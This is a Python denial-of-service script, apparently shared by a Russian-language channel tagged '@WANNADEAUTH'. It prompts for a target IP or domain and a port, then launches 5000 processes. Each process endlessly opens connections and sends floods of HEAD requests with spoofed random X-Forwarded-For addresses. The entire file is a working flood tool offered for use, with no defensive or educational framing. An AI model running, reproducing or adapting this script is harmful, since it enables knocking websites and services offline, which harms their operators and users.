# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH

import socket
import os, sys
import time
import multiprocessing, random
from colorama import Fore as F

r = F.RED
y = F.YELLOW
w = F.WHITE

print(f"{w}Наш канал: {y}@WANNADEAUTH                                             {w}V{r}2.1")
print(f"{w}------------------------------------------------------------------------")
ip = input("IP/Домен: ")
port = int(input("Порт: "))

url = "http://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

print("[?] Запуск атаки..")


time.sleep(1)


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
      pass


def send2attack():
  for i in range(5000): 
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() 

send2attack() 

# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
